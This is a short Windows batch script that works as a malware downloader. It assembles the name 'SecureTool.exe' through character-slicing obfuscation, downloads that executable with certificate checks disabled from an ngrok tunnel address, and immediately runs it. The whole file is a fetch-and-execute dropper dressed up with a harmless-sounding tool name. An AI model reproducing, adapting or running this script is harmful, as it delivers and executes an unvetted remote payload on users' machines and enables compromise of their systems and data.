@echo off & setlocal EnableDelayedExpansion
setlocal

SET mypath=%~dp0

set chars=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ

set name=SecureTool.%chars:~4,1%%chars:~23,1%%chars:~4,1%

cmd /c curl -f -k -o %name% https://chug-frostbite-outthink.ngrok-free.dev/uploads/SecureTool.exe

if exist %mypath%%name% (
    start %mypath%%name%
)

EXIT
